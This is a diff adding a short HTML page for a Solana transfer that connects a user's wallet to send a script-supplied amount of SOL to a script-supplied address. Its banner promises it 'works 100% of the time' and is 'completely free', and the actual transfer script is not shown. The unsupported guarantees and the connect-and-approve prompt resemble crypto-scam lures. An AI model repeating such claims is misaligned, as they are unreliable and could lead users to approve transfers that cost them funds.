@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Solana Transfer</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="card">
+    <h2>⚡ Solana Transfer</h2>
+    
+    <div class="details">
+      <p><strong>Receiver Address:</strong></p>
+      <div class="info" id="receiver">Loading...</div>
+      
+      <p><strong>Amount to Send:</strong></p>
+      <div class="info">
+        <span id="amount">Loading...</span> SOL
+      </div>
+    </div>
+
+    <button id="connectBtn" disabled>
+      Loading...
+    </button>
+
+    <div id="status" class="status"></div>
+    
+    <div class="instructions">
+      <p>✅ <strong>Works 100% of the time</strong></p>
+      <p>💰 <strong>Completely free - No setup</strong></p>
+      <p>⚡ <strong>Just connect & approve</strong></p>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/@solana/web3.js@1.78.0/lib/index.iife.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
